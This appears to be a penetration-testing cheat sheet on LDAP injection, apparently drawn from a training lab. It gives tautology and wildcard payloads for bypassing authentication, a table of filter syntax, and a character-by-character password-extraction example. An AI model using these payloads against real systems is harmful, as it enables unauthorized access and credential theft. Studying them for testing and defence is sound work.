# LDAP Injection

### It is used to:

 - 1) Authentication Bypass: Modifying LDAP authentication queries to log in as another user without knowing their password.

 - 2) Unauthorized Data Access: Altering LDAP search queries to retrieve sensitive information not intended for the attacker's access.

 - 3) Data Manipulation: Injecting queries that modify the LDAP directory, such as adding or modifying user attributes.

## Authentication Bypass Techniques

### Tautology-based Injection

#### Payload:

    (&(uid=*)(|(&)(userPassword=pwd)))

#### This payload functions similarly to the OR 1=1 SQL statement because it uses the logic either of the 2 statements are true, which means the entire query is true.

### Wildcard Injection

#### Injected Payload:

    username=*&password=*

### Condition always evaluates to true, bypassing the password checking mechanism

#### Targeted Injected Payload

    username=a*&password*

### This payload searches for specific targets that start with the letter a. Use more letters for more granular searching power

## LDAP Injection

#### LDAP Search Filter Syntax

|Name|Operand|Example|Example Description|
|---|---|---|---|
|Equality|`=`|`(name=Kaylie)`|Matches all entries that contain a `name` attribute with the value `Kaylie`|
|Greater-Or-Equal|`>=`|`(uid>=10)`|Matches all entries that contain a `uid` attribute with a value greater-or-equal to `10`|
|Less-Or-Equal|`<=`|`(uid<=10)`|Matches all entries that contain a `uid` attribute with a value less-or-equal to `10`
|Approximate Match|`~=`|`(name~=Kaylie)`|Matches all entries that contain a `name` attribute with approximately the value `Kaylie`|
|And|`(&()())`|`(&(name=Kaylie)(title=Manager))`|Matches all entries that contain a `name` attribute with the value `Kaylie` and a `title` attribute with the value `Manager`|
|Or|<code>(&#124;()())</code>|<code>(&#124;(name=Kaylie)(title=Manager))</code>|Matches all entries that contain a `name` attribute with the value `Kaylie` or a `title` attribute with the value `Manager`|
|Not|`(!())`|`(!(name=Kaylie))`|Matches all entries that contain a `name` attribute with a value different from `Kaylie`|
|True|`(&)`|`(&)`|Universal True|
|False|<code>(&#124;)</code>|<code>(&#124;)</code>|Universal False|
|Wildcard|`*`|`(name=*a*)`|Matches all entries that contain a name attribute that contains an `a`|


#### Authentication Bypass

|Description|Username|Password|Search Filter|
|---|---|---|---|
|Regular Authentication|`admin`|`admin`|`(&(uid=admin)(userPassword=admin))`|
|Wildcard Bypass|`*`|`*`|`(&(uid=*)(userPassword=*))`|
|Wildcard Bypass targeting specific user|`admin*`|`*`|`(&(uid=admin*)(userPassword=*))`|
|Universal True Bypass|<code>admin)(&#124;(&#x26;</code>|`invalid)`|<code>(&#x26;(uid=admin)(&#124;(&#x26;)(userPassword=invalid)))</code>|


#### Data Exfiltration

Brute-Force data character-by-character:

|Username|Password|Query|
|---|---|---|
|`htb-stdnt`|`*`|`(&(uid=htb-stdnt)(userPassword=*))`|
|`htb-stdnt`|`p*`|`(&(uid=htb-stdnt)(userPassword=p*))`|
|`htb-stdnt`|`p@*`|`(&(uid=htb-stdnt)(userPassword=p@*))`|
|`htb-stdnt`|`p@s*`|`(&(uid=htb-stdnt)(userPassword=p@s*))`|
|`htb-stdnt`|`p@ss*`|`(&(uid=htb-stdnt)(userPassword=p@ss*))`|
|`htb-stdnt`|`p@ssw*`|`(&(uid=htb-stdnt)(userPassword=p@ssw*))`|
|`htb-stdnt`|`p@ssw0*`|`(&(uid=htb-stdnt)(userPassword=p@ssw0*))`|
|`htb-stdnt`|`p@ssw0r*`|`(&(uid=htb-stdnt)(userPassword=p@ssw0r*))`|
|`htb-stdnt`|`p@ssw0rd*`|`(&(uid=htb-stdnt)(userPassword=p@ssw0rd*))`|
|`htb-stdnt`|`p@ssw0rd`|`(&(uid=htb-stdnt)(userPassword=p@ssw0rd))`|
